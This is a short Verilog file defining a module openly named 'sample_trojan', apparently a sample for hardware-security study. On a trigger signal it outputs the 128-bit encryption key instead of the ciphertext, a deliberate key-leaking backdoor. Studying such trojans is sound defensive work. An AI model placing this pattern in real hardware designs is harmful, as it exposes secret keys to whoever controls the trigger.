`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 05/14/2024 07:10:47 PM
// Design Name: 
// Module Name: sample_trojan
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////


module sample_trojan(clk, sample_trojan_trigger, key, ciphertext, trojan_out);

input clk;
input sample_trojan_trigger;
input [127:0] key;
input [127:0] ciphertext;
output reg [127:0] trojan_out;

always @(posedge clk) begin
    if (sample_trojan_trigger)
        trojan_out <= key;
    else
        trojan_out <= ciphertext;
end
endmodule
